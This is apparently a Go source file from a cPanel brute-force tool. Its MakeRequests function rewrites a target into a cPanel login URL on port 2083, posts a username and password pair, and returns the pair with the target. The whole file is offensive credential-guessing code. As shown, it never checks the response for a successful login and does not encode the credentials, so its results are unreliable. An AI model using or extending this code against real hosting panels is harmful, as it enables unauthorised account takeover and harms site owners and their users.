package cpanelbrute

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
)

func MakeRequests(target string, creds string) ([]string, error) {
	splitedCreds := strings.Split(creds, ":")
	if len(splitedCreds) != 2 {
		err := errors.New("invalid credentials format")
		return nil, err
	}
	splitedTarget := strings.Split(target, ":")
	if len(splitedTarget) != 2 {
		if checkIP := net.ParseIP(target).To4(); checkIP != nil {
			domains, err := LookupIP(target)
			if err != nil {
				return nil, err
			}
			domain := strings.TrimSuffix(domains[0], ".")
			target = fmt.Sprintf("https://%s:2083/login/?login_only=1", domain)
		} else {
			target = fmt.Sprintf("%s:2083/login/?login_only=1", target)
		}

	} else if strings.Contains(target, ":2083/") {
		target = fmt.Sprintf("%slogin/?login_only=1", target)
	} else if strings.Contains(target, ":2083") {
		target = fmt.Sprintf("%s/login/?login_only=1", target)
	}

	fmt.Printf("target: %v\n", target)
	username, password := splitedCreds[0], splitedCreds[1]
	payloadStr := fmt.Sprintf("user=%s&pass=%s", username, password)
	payload := []byte(payloadStr)
	contentType := "application/x-www-form-urlencoded"
	res, err := http.Post(target, contentType, bytes.NewBuffer(payload))

	if err != nil {
		return nil, err
	}

	defer res.Body.Close()

	_, err = io.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}
	target = strings.TrimSuffix(target, "/login/?login_only=1")
	splitedCreds = append(splitedCreds, target)
	return splitedCreds, nil
}
